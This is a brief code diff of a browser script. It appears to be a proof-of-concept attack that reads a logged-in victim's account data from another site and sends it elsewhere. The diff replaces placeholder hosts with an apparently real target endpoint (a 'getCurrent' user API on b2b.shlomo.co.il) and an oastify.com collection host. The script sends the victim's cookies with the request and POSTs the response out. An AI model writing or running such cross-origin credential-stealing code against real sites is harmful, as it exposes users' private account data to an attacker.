@@ -15,7 +15,7 @@
     
     <script>
         // Fetch API to send a POST request and store the response
-        fetch('https://vulnerable-app.com/transfer', {
+        fetch('https://b2b.shlomo.co.il/common_api/user/getCurrent', {
             method: 'GET',
             credentials: 'include', // Ensures cookies are sent with the request
             headers: {
@@ -27,7 +27,7 @@
             console.log(data); // Log the response content to the console
 
             // Optionally, send the response data to a remote server you control
-            fetch('https://attacker-site.com/store', {
+            fetch('6ipzie5g1uf43f4tzw8c5roaw12sqie7.oastify.com', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
